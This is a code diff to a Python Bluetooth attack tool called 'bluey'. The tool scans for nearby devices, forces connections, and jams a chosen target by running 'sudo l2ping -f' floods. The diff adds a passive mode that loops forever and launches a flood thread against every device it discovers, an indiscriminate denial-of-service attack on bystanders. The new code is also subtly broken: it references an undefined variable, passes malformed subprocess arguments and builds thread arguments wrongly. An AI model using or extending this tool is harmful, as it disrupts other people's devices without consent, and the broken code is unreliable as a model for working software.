@@ -4,6 +4,9 @@ import art
 import subprocess
 from alive_progress import alive_bar
 import time
+import threading
+
+blocked_addr = []
 
 art.tprint("bluey")
 print("=====================================")
@@ -13,16 +16,20 @@ print("I am not responsible for any damages or misuse from this software.\nThis 
 def scan():
     try:
         
+        print("Scanning for devices...")
+
         nearby_devices = discover_devices(lookup_names = True)
+        
 
         print(" ")
         print("        Devices:\n")
-        print("==========================")
+        print("============================================")
         for name, addr in nearby_devices:
             print (" > %s - %s" % (addr, name))
+            
 
         print(" \n")
-        print("==========================")
+        print("============================================")
         print ("found %d devices" % len(nearby_devices))
         print(" ")
     except OSError as error:
@@ -44,6 +51,55 @@ def force_connect(target):
             subprocess.call(connect)
             bar()
 
+def passive_prevent(target):
+
+    
+    if item in blocked_addr:
+        pass
+    else:
+        subprocess.call(["sudo l2ping -i ", interface, " -s ", packetsize, " -f " , target], stdout=open(os.devnull, 'wb'))
+
+def passive_scan():
+    try:
+        
+        if interface == " ":
+            print("Bluetooth Interface not set")
+            main()
+        if packetsize == " ":
+            print("Packet size not set")
+            main()
+        if target == " ":
+            print("target not set")
+            main()
+
+        os.system("clear")
+
+        threads = []
+
+
+        while True:       
+            nearby_devices = discover_devices(lookup_names=True)
+            
+            print(" ")
+        
+            for name, addr in nearby_devices:
+                print("Blocked devices:")
+                print (" > %s - %s" % (addr, name))
+                t = threading.Thread(target=passive_prevent, args=(addr))
+                t.start()
+                threads.append(t)
+                blocked_addr.append(addr)
+
+            print(" \n")
+            print(" ")
+
+            os.system("clear")
+    except OSError as error:
+        print(error)
+        print("Make sure your bluetooth adapter is up and connected")
+        main()
+
+
 def jam():
     if interface == " ":
         print("Bluetooth Interface not set")
@@ -56,7 +112,7 @@ def jam():
         main()
 
     print("Starting packet flow")
-    os.system("l2ping -i" + interface + "-s " + packetsize + " -f " + target)
+    os.system("sudo l2ping -i " + interface + " -s " + packetsize + " -f " + target)
     
 def help_menu():
     print(" \n")
@@ -99,7 +155,7 @@ def main():
         if(cmd == "set" and subcmd == "target"):
             global target
             target = arg
-            print(target + "---> target\n")
+            print(target + " ---> target\n")
 
         if(cmd == "jam"):
             jam()
@@ -107,12 +163,12 @@ def main():
         if(cmd == "set" and subcmd == "packetsize"):
             global packetsize
             packetsize = arg
-            print(packetsize + "---> packet size\n")
+            print(packetsize + " ---> packet size\n")
 
         if(cmd == "set" and subcmd == "interface"):
             global interface
             interface = arg
-            print(interface + "---> bluetooth interface\n")
+            print(interface + " ---> bluetooth interface\n")
 
         if(cmd == "forceconnect"):
             force_connect(target)
